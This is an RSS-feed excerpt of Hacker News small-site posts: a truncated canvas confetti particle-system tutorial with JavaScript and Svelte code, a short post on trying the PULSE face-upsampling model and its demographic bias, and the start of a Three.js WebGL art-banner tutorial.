<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div display="none,none,block"><h3 id="the-confetti-particle" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#the-confetti-particle" aria-label="the confetti particle permalink" color="brand.main" font-family="systemSans"></a>The confetti particle</h3><p><img alt="" src="https://varun.ca/static/confetti-particle-c3495d9df83f93a9c7e33c8fb9f40e9b.svg" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">Each particle has a few attributes that define its state:</p><ul><li font-family="systemSans" color="neutral.0" font-size="2,3">Start position</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Angle: the direction of movement</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Velocity: how fast it’s moving</li></ul><p font-family="systemSans" color="neutral.0" font-size="2,3">All combined, these tell us where the particle is, which direction it’s moving in, and how fast.</p><h3 id="lets-move-it" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#lets-move-it" aria-label="lets move it permalink" color="brand.main" font-family="systemSans"></a>Let’s move it</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">We’ll use the <a href="https://www.khanacademy.org/science/physics/two-dimensional-motion/two-dimensional-projectile-mot/a/what-are-velocity-components" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">velocity components</a> to move the particle.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
particle<span>.</span>y <span>+=</span> Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">This essentially describes the motion in terms of vectors.</p><div data-language="text"><pre><code>New position = Current Position + Velocity Vector</code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Often graphics &amp; physics libraries use an actual vector object. I’m keeping things simple and breaking up the motion into x and y directions.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">This is the foundational movement we’ll build on top of. Right now, it lacks any natural characteristics. It is the equivalent of confetti being fired in space. On Earth, its motion is impacted by external forces: friction, air resistance and gravity.</p><h3 id="decay" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#decay" aria-label="decay permalink" color="brand.main" font-family="systemSans"></a>Decay</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Friction is the first of those forces. We model that as a decay multiplier.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">The decay should be less than 1 to slow things down. In each frame, we multiply the velocity by decay. The smaller the value, the quicker it’ll slow down.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
particle<span>.</span>y <span>+=</span> Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
<span>particle<span>.</span>velocity <span>*=</span> particle<span>.</span>decay<span>;</span></span></code></pre></div><h3 id="gravity" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#gravity" aria-label="gravity permalink" color="brand.main" font-family="systemSans"></a>Gravity</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">What goes up must come down, with a bit of gravity.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">The confetti’s net motion is a combination of three forces: the initial launch, the decay and the gravity.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">It starts by launching upwards. The decay then starts slowing it down. Then eventually, the gravity overpowers it and starts pulling it downwards in the y-direction.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
<span>particle<span>.</span>y <span>+=</span></span><span>  Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity <span>+</span> particle<span>.</span>gravity<span>;</span></span>particle<span>.</span>velocity <span>*=</span> particle<span>.</span>decay<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Too little gravity, and it’ll look like the confetti was fired on the Moon. And too much gravity will stop it from getting very far. You can tweak the value to find the right balance.</p><h3 id="tilt" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#tilt" aria-label="tilt permalink" color="brand.main" font-family="systemSans"></a>Tilt</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">The confetti also tilts as it moves. Sometimes rotating just one way and sometimes back and forth.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Each particle will have a starting tilt angle. Chosen randomly at launch. Which is then animated using <a href="https://github.com/jwagner/simplex-noise.js" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">noise</a>. Which gives it a more natural tumbling look.</p><div data-language="js"><pre><code><span>const</span> tiltOffset <span>=</span> Random<span>.</span><span>noise2D</span><span>(</span>
  particle<span>.</span>x <span>/</span> particle<span>.</span>random<span>,</span>
  particle<span>.</span>y <span>/</span> particle<span>.</span>random<span>,</span>
  <span>1</span><span>,</span>
  Math<span>.</span><span>PI</span> <span>/</span> <span>16</span>
<span>)</span><span>;</span>
particle<span>.</span>tiltAngle <span>=</span> particle<span>.</span>tiltAngle <span>+</span> tiltOffset<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Noise is a perfect tool for simulating organic motion. Think of it as a smoother form of randomness.</p><p font-size="2" color="neutral.1" font-family="systemSans">🚂  Not familiar with noise? Checkout this Coding Train episode for a primer: <a href="https://www.youtube.com/watch?v=Qf4dIN99e2w" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">Introduction - Perlin Noise and p5.js Tutorial</a></p><h3 id="wobble" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#wobble" aria-label="wobble permalink" color="brand.main" font-family="systemSans"></a>Wobble</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">In nature, things rarely move in straight lines. We’re going to add a bit of wobble. This will simulate the effect of confetti wafting through the air.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">We’ll once again use noise. This time, however, it will add an offset to the x-position of the particle.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>

<span>const</span> xOffset <span>=</span> Random<span>.</span><span>noise2D</span><span>(</span>
  particle<span>.</span>x <span>/</span> particle<span>.</span>random<span>,</span>
  particle<span>.</span>y <span>/</span> particle<span>.</span>random
<span>)</span><span>;</span>


particle<span>.</span>x <span>=</span> particle<span>.</span>x <span>+</span> xOffset<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">That’s much better. The movement feels a lot more natural now.</p><h3 id="the-particle-system" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#the-particle-system" aria-label="the particle system permalink" color="brand.main" font-family="systemSans"></a>The particle system</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Moving on to the particle system. Each particle is an object. This object tracks all its visual characteristics and those related to motion.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">We also need to track the lifetime of each particle. Notice how they fade out after a while? That’s their lifetime. We do this to track when the animation is complete and trigger another one. I chose to track the lifetime as ticks or frame count.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">It will be responsible for four aspects:</p><ul><li font-family="systemSans" color="neutral.0" font-size="2,3"><strong>Creating</strong> the particles and seeding their initial attributes. For example, launch velocity, tilt and colour.</li><li font-family="systemSans" color="neutral.0" font-size="2,3"><strong>Updating</strong> their motion at each tick or frame. And marking them as dead once their allotted tick count has been reached.</li><li font-family="systemSans" color="neutral.0" font-size="2,3"><strong>Drawing</strong> the particle</li><li font-family="systemSans" color="neutral.0" font-size="2,3"><strong>Resetting</strong>  the particles once all of them are dead and triggering another pop</li></ul><p font-family="systemSans" color="neutral.0" font-size="2,3">Now, some attributes are defined at the system level and passed down. For example, start position, gravity, decay and the size of the particle. While others, such as colour, are set for each particle.</p><div data-language="js"><pre><code>
<span>{</span>
  particleCount<span>:</span> <span>90</span><span>,</span>
  radiusRatio<span>:</span> <span>0.02</span><span>,</span>
  animDelay<span>:</span> <span>600</span><span>,</span>
  noInteractionWait<span>:</span> <span>5000</span><span>,</span>
  velocityFactor<span>:</span> <span>0.15</span><span>,</span>
  decay<span>:</span> <span>0.94</span><span>,</span>
  gravity<span>:</span> <span>3</span><span>,</span>
  x<span>:</span> <span>0</span><span>,</span>
  y<span>:</span> <span>0</span><span>,</span>
  colors<span>,</span>
<span>}</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Some attributes are set at the system level but inform individual particles—for example, direction and velocity. We pick a direction of launch. Then each particle is launched in that direction ± a slight variance. The larger the variance, the wider the confetti will spread.</p><h3 id="an-even-spread" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#an-even-spread" aria-label="an even spread permalink" color="brand.main" font-family="systemSans"></a>An even spread</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">At this point, we have a confetti system. The fun thing about particle systems is that you can tweak their behaviour in all kinds of exciting ways. I wanted to recreate an effect similar to the <a href="https://www.artbasel.com/catalog/artwork/36465/Laura-Bel%C3%A9m-Carnival-Nights" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">original image</a>. Make the confetti pop from one location, but then get it to spread somewhat evenly across the canvas.</p><p><img alt="" src="https://varun.ca/static/confetti-spread-fffb73960e01575a6011ae0ae25ac995.svg" width="100%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">Instead of cascading the launch angle down to the particle, we’ll try something different. We start by picking a random start position. Based on the bounds, we calculate a random end position—a different one for each particle. Now we have a start point and an endpoint. With a bit of trigonometry, we can calculate the angle between them. And then calculate a lunch velocity as a function of the distance between the two points.</p><div data-language="js"><pre><code><span>function</span> <span>setEndLocation</span><span>(</span><span><span>{</span> width<span>,</span> height <span>}</span><span>,</span> x<span>,</span> y</span><span>)</span> <span>{</span>
  <span>const</span> xBounds <span>=</span> <span>[</span><span>-</span>x<span>,</span> width <span>-</span> x<span>]</span><span>;</span>
  <span>const</span> yBounds <span>=</span> <span>[</span><span>-</span>y<span>,</span> height <span>-</span> y<span>]</span><span>;</span>

  <span>return</span> <span>[</span>x <span>+</span> Random<span>.</span><span>range</span><span>(</span><span>...</span>xBounds<span>)</span><span>,</span> y <span>+</span> Random<span>.</span><span>range</span><span>(</span><span>...</span>yBounds<span>)</span><span>]</span><span>;</span>
<span>}</span>

<span>function</span> <span>launchAngle</span><span>(</span><span><span>[</span>x1<span>,</span> y1<span>]</span><span>,</span> <span>[</span>x2<span>,</span> y2<span>]</span></span><span>)</span> <span>{</span>
  <span>return</span> Math<span>.</span><span>atan2</span><span>(</span>y2 <span>-</span> y1<span>,</span> x2 <span>-</span> x1<span>)</span><span>;</span>
<span>}</span>

<span>function</span> <span>launchVelocity</span><span>(</span><span>maxDist<span>,</span> startPos<span>,</span> endPos<span>,</span> startVelocity</span><span>)</span> <span>{</span>
  <span>const</span> d <span>=</span> <span>dist</span><span>(</span>startPos<span>,</span> endPos<span>)</span><span>;</span>
  <span>return</span> <span>mapRange</span><span>(</span>d<span>,</span> <span>0</span><span>,</span> maxDist<span>,</span> startVelocity <span>*</span> <span>0.1</span><span>,</span> <span>1</span> <span>*</span> startVelocity<span>)</span><span>;</span>
<span>}</span></code></pre></div><h3 id="integrating-it-into-an-app" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#integrating-it-into-an-app" aria-label="integrating it into an app permalink" color="brand.main" font-family="systemSans"></a>Integrating it into an app</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">I originally built this as a <a href="https://carnival-nights.netlify.app/" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">digital greeting card</a>. It sits inside a larger <a href="https://github.com/winkerVSbecks/carnival-nights" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">Svelte app</a>.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Canvas is quite portable. You can render the DOM node using vanilla HTML or a SPA framework like React or Svelte. And once the DOM node mounts, initialize the animation. The animation then runs in its own loop. You can leave it unattached or trigger a refresh based on props.</p><p>Canvas.svelte</p><div data-language="html"><pre><code><span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span>
  <span>import</span> <span>{</span> onMount <span>}</span> <span>from</span> <span>'svelte'</span><span>;</span>
  <span>import</span> initConfettiSystem <span>from</span> <span>'./confetti-system'</span><span>;</span>
  <span>let</span> canvasEl<span>;</span>
  <span>onMount</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>initConfettiSystem</span><span>(</span>canvasEl<span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>

<span><span><span>&lt;</span>canvas</span> <span>class</span><span><span>=</span><span>"</span>carnival-nights<span>"</span></span> <span><span>bind:</span>this</span><span><span>=</span><span>"</span>{canvasEl}<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>canvas</span><span>&gt;</span></span></code></pre></div></div><div display="block,block,none"><h3 id="the-confetti-particle" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#the-confetti-particle" aria-label="the confetti particle permalink" color="brand.main" font-family="systemSans"></a>The confetti particle</h3><p><img alt="" src="https://varun.ca/static/confetti-particle-c3495d9df83f93a9c7e33c8fb9f40e9b.svg" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">Each particle has a few attributes that define its state:</p><ul><li font-family="systemSans" color="neutral.0" font-size="2,3">Start position</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Angle: the direction of movement</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Velocity: how fast it’s moving</li></ul><p font-family="systemSans" color="neutral.0" font-size="2,3">All combined, these tell us where the particle is, which direction it’s moving in, and how fast.</p><h3 id="lets-move-it" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#lets-move-it" aria-label="lets move it permalink" color="brand.main" font-family="systemSans"></a>Let’s move it</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">We’ll use the <a href="https://www.khanacademy.org/science/physics/two-dimensional-motion/two-dimensional-projectile-mot/a/what-are-velocity-components" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">velocity components</a> to move the particle.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
particle<span>.</span>y <span>+=</span> Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">This essentially describes the motion in terms of vectors.</p><div data-language="text"><pre><code>New position = Current Position + Velocity Vector</code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Often graphics &amp; physics libraries use an actual vector object. I’m keeping things simple and breaking up the motion into x and y directions.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">This is the foundational movement we’ll build on top of. Right now, it lacks any natural characteristics. It is the equivalent of confetti being fired in space. On Earth, its motion is impacted by external forces: friction, air resistance and gravity.</p><h3 id="decay" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#decay" aria-label="decay permalink" color="brand.main" font-family="systemSans"></a>Decay</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Friction is the first of those forces. We model that as a decay multiplier.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">The decay should be less than 1 to slow things down. In each frame, we multiply the velocity by decay. The smaller the value, the quicker it’ll slow down.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
particle<span>.</span>y <span>+=</span> Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
<span>particle<span>.</span>velocity <span>*=</span> particle<span>.</span>decay<span>;</span></span></code></pre></div><h3 id="gravity" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#gravity" aria-label="gravity permalink" color="brand.main" font-family="systemSans"></a>Gravity</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">What goes up must come down, with a bit of gravity.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">The confetti’s net motion is a combination of three forces: the initial launch, the decay and the gravity.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">It starts by launching upwards. The decay then starts slowing it down. Then eventually, the gravity overpowers it and starts pulling it downwards in the y-direction.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>
<span>particle<span>.</span>y <span>+=</span></span><span>  Math<span>.</span><span>sin</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity <span>+</span> particle<span>.</span>gravity<span>;</span></span>particle<span>.</span>velocity <span>*=</span> particle<span>.</span>decay<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Too little gravity, and it’ll look like the confetti was fired on the Moon. And too much gravity will stop it from getting very far. You can tweak the value to find the right balance.</p><h3 id="tilt" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#tilt" aria-label="tilt permalink" color="brand.main" font-family="systemSans"></a>Tilt</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">The confetti also tilts as it moves. Sometimes rotating just one way and sometimes back and forth.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Each particle will have a starting tilt angle. Chosen randomly at launch. Which is then animated using <a href="https://github.com/jwagner/simplex-noise.js" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">noise</a>. Which gives it a more natural tumbling look.</p><div data-language="js"><pre><code><span>const</span> tiltOffset <span>=</span> Random<span>.</span><span>noise2D</span><span>(</span>
  particle<span>.</span>x <span>/</span> particle<span>.</span>random<span>,</span>
  particle<span>.</span>y <span>/</span> particle<span>.</span>random<span>,</span>
  <span>1</span><span>,</span>
  Math<span>.</span><span>PI</span> <span>/</span> <span>16</span>
<span>)</span><span>;</span>
particle<span>.</span>tiltAngle <span>=</span> particle<span>.</span>tiltAngle <span>+</span> tiltOffset<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Noise is a perfect tool for simulating organic motion. Think of it as a smoother form of randomness.</p><p font-size="2" color="neutral.1" font-family="systemSans">🚂  Not familiar with noise? Checkout this Coding Train episode for a primer: <a href="https://www.youtube.com/watch?v=Qf4dIN99e2w" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">Introduction - Perlin Noise and p5.js Tutorial</a></p><h3 id="wobble" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#wobble" aria-label="wobble permalink" color="brand.main" font-family="systemSans"></a>Wobble</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">In nature, things rarely move in straight lines. We’re going to add a bit of wobble. This will simulate the effect of confetti wafting through the air.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">We’ll once again use noise. This time, however, it will add an offset to the x-position of the particle.</p><div data-language="js"><pre><code>particle<span>.</span>x <span>+=</span> Math<span>.</span><span>cos</span><span>(</span>particle<span>.</span>angle<span>)</span> <span>*</span> particle<span>.</span>velocity<span>;</span>

<span>const</span> xOffset <span>=</span> Random<span>.</span><span>noise2D</span><span>(</span>
  particle<span>.</span>x <span>/</span> particle<span>.</span>random<span>,</span>
  particle<span>.</span>y <span>/</span> particle<span>.</span>random
<span>)</span><span>;</span>


particle<span>.</span>x <span>=</span> particle<span>.</span>x <span>+</span> xOffset<span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">That’s much better. The movement feels a lot more natural now.</p><h3 id="the-particle-system" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#the-particle-system" aria-label="the particle system permalink" color="brand.main" font-family="systemSans"></a>The particle system</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Moving on to the particle system. Each particle is an object. This object tracks all its visual characteristics and those related to motion.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">We also need to track the lifetime of each particle. Notice how they fade out after a while? That’s their lifetime. We do this to track when the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://varun.ca/confetti/">https://varun.ca/confetti/</a></em></p>]]>
            </description>
            <link>https://varun.ca/confetti/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520993</guid>
            <pubDate>Wed, 23 Dec 2020 19:15:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An easy way to try out the PULSE algorithm – Biased Random Walk]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520902">thread link</a>) | @andrewon
<br/>
December 23, 2020 | https://ctawong.com/articles/pulse.html | <a href="https://web.archive.org/web/*/https://ctawong.com/articles/pulse.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><a href="https://colab.research.google.com/github/ctawong/PULSE_from_image_url/blob/master/PULSE_URL.ipynb"><img src="https://camo.githubusercontent.com/52feade06f2fecbf006889a904d221e6a730c194/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt=""></a></p>

<p><a href="https://github.com/ctawong/PULSE_from_image_url">Github link</a></p>

<p>PULSE (Photo Upsampling via Latent Space Exploration) is a new <a href="https://arxiv.org/abs/2003.03808">algorithm</a> published in 2020 that generates a high resolution facial image from a low resolution one. The main idea is to encode a low resolution image to a latent variable with <a href="https://en.wikipedia.org/wiki/Generative_adversarial_network">GAN</a>, change the latent variable a little bit, and generate a new but highly similar image.</p>

<p>To make it easier for anyone to try out PULSE, I wrote a <a href="https://colab.research.google.com/github/ctawong/PULSE_from_image_url/blob/master/PULSE_URL.ipynb">COLAB notebook</a> that takes an image URL (such as those obtained from Google image search), performs downsampling, and then upsampling with PULSE.</p>

<p>Instruction to run</p>

<ol>
  <li>Open the <a href="https://colab.research.google.com/github/ctawong/PULSE_from_image_url/blob/master/PULSE_URL.ipynb">COLAB notebook</a></li>
  <li>Click “Connect” button on top right to connect to the GPU server.</li>
  <li>Replace Photo_URL with an URL of your interest</li>
  <li>Click the play button on the left of the second cell.</li>
</ol>

<p>It usually takes a minute or two to generate a new image.</p>

<p>Below are a few examples. Image on the left is the original, middle one is the downsampled original, and the right one is the image generated by PULSE.</p>

<p><img src="https://ctawong.com/assets/uploads/pulse1.png" alt=""></p>

<p><img src="https://ctawong.com/assets/uploads/pulse2.png" alt=""></p>

<p>Pretty good! You may think. Things go a bit haywire with some images…</p>

<p><img src="https://ctawong.com/assets/uploads/pulse3.png" alt=""></p>

<p><img src="https://ctawong.com/assets/uploads/pulse4.png" alt=""></p>

<p><img src="https://ctawong.com/assets/uploads/pulse5.png" alt=""></p>

<p><img src="https://ctawong.com/assets/uploads/pulse_senior1.png" alt=""></p>

<p><img src="https://ctawong.com/assets/uploads/pulse_senior2.png" alt=""></p>

<p>As you can see, the generator is biased towards white young-looking adults. In fact there have been a lot of discussion around bias implicit in machine learning models. To sum up, it’s all about the training data. The models simply fill in the gap based on what they saw from the training data. The PULSE model was trained with the a <a href="https://github.com/NVlabs/ffhq-dataset">dataset of Flickr images</a> and inherited all its bias. The bias issue can likely be resolved by carefully selecting a dataset with diverse age, ethnicity and gender.</p>

  </div>

  
  
  


</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://ctawong.com/articles/pulse.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520902</guid>
            <pubDate>Wed, 23 Dec 2020 19:07:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating Dynamic Van Gogh with WebGL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520893">thread link</a>) | @smpnjn
<br/>
December 23, 2020 | https://fjolt.com/article/webgl-dynamic-art-background | <a href="https://web.archive.org/web/*/https://fjolt.com/article/webgl-dynamic-art-background">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
        



<!--#sidebar-->
        <article id="content">
            
            <div id="content-text">
                <p>Modern web design often makes use of <strong>large introduction hero images</strong>. These large images frame a product or service at the top of the website. Making these interactive often increases time spent on site.</p>
<p>This got me thinking of how we could use WebGL to make an interactive 'hero' banner, while also looking a bit like a piece of art. What I created was something similar to Van Gogh's "Starry Night", which nicely transforms into liquid if you want it to.</p>
<p><a href="https://codepen.io/smpnjn/pen/mdrBXQr">Link to Demo</a></p>
<p><img src="https://fjolt.com/images/misc/23122020.webp" alt="Short animated image of the WebGL art effect" loading="lazy"></p><h2>Step 1. Three.JS</h2>
<p>Three.js is a Javascript library which allows you to create WebGL 3d objects with ease. To accomplish our effect we will be following a few key steps:</p>
<ul>
    <li>1. <strong>Create the geometry</strong> (shape) with Three.JS</li>
    <li>2. <strong>Render</strong> this onto a HTML5 canvas</li>
    <li>3. Pass this geometry data to <strong>shaders</strong></li>
    <li>4. <strong>Animate</strong> this using Javascript</li>
    <li>5. <strong>Manipulate the geometry</strong> with the shaders</li>
</ul>
<p>So with that in mind, lets take a look at a snippet of our Javascript, which covers the first 3 points.</p>
<pre><p>javascript <span>Copy</span></p><code>
    
    <span>const</span> noise <span>=</span> <span>await</span> <span>loader</span><span>(</span><span>'./shaders/noise.glsl'</span><span>)</span><span>;</span>
    <span>const</span> fragment <span>=</span> <span>await</span> <span>loader</span><span>(</span><span>'./shaders/fragment.glsl'</span><span>)</span><span>;</span>
    <span>const</span> vertex <span>=</span> <span>await</span> <span>loader</span><span>(</span><span>'./shaders/vertex.glsl'</span><span>)</span><span>;</span>

    <span>const</span> renderer <span>=</span> <span>new</span> <span>THREE<span>.</span>WebGLRenderer</span><span>(</span><span>{</span>
        powerPreference<span>:</span> <span>"high-performance"</span><span>,</span>
        antialias<span>:</span> <span>true</span><span>,</span> 
        alpha<span>:</span> <span>true</span><span>,</span>
        canvas<span>:</span> canvas 
    <span>}</span><span>)</span><span>;</span>
    
    
    <span>let</span> elWidth <span>=</span> <span>window</span><span>.</span><span>innerWidth</span><span>;</span>
    <span>let</span> elHeight <span>=</span> <span>window</span><span>.</span><span>innerHeight</span>
    
    
    renderer<span>.</span><span>setSize</span><span>(</span> elWidth<span>,</span> elHeight <span>)</span><span>;</span>
    <span>document</span><span>.</span><span>body</span><span>.</span><span>appendChild</span><span>(</span> renderer<span>.</span><span>domElement</span> <span>)</span>
    renderer<span>.</span><span>setPixelRatio</span><span>(</span> elWidth<span>/</span>elHeight <span>)</span><span>;</span>
    <span>const</span> scene <span>=</span> <span>new</span> <span>THREE<span>.</span>Scene</span><span>(</span><span>)</span><span>;</span>
    <span>const</span> camera <span>=</span> <span>new</span> <span>THREE<span>.</span>PerspectiveCamera</span><span>(</span> <span>75</span><span>,</span> elWidth <span>/</span> elHeight<span>,</span> <span>0.1</span><span>,</span> <span>1000</span> <span>)</span><span>;</span>
    
    <span>let</span> i <span>=</span> <span>2</span><span>;</span>
    
    <span>let</span> high <span>=</span> config<span>.</span><span>colors</span><span>[</span>i<span>]</span><span>.</span><span>high</span><span>;</span> 
    <span>let</span> low <span>=</span> config<span>.</span><span>colors</span><span>[</span>i<span>]</span><span>.</span><span>low</span><span>;</span>

    
    <span>let</span> geometry <span>=</span> <span>new</span> <span>THREE<span>.</span>PlaneGeometry</span><span>(</span><span>600</span><span>,</span> <span>600</span><span>,</span> <span>100</span><span>,</span> <span>100</span><span>)</span><span>;</span>
    <span>let</span> material <span>=</span> <span>new</span> <span>THREE<span>.</span>ShaderMaterial</span><span>(</span><span>{</span>
        uniforms<span>:</span> <span>{</span>
            
            
            u_lowColor<span>:</span> <span>{</span>type<span>:</span> <span>'v3'</span><span>,</span> value<span>:</span> low <span>}</span><span>,</span>
            u_highColor<span>:</span> <span>{</span>type<span>:</span> <span>'v3'</span><span>,</span> value<span>:</span> high <span>}</span><span>,</span>
            u_time<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>0</span><span>}</span><span>,</span>
            u_resolution<span>:</span> <span>{</span>type<span>:</span> <span>'v2'</span><span>,</span> value<span>:</span> <span>new</span> <span>THREE<span>.</span>Vector2</span><span>(</span>elWidth<span>,</span> elHeight<span>)</span> <span>}</span><span>,</span>
            u_mouse<span>:</span> <span>{</span>type<span>:</span> <span>'v2'</span><span>,</span> value<span>:</span> <span>new</span> <span>THREE<span>.</span>Vector2</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>)</span> <span>}</span><span>,</span>
            u_height<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>1</span><span>}</span><span>,</span>
            u_manipulate<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>1</span> <span>}</span><span>,</span>
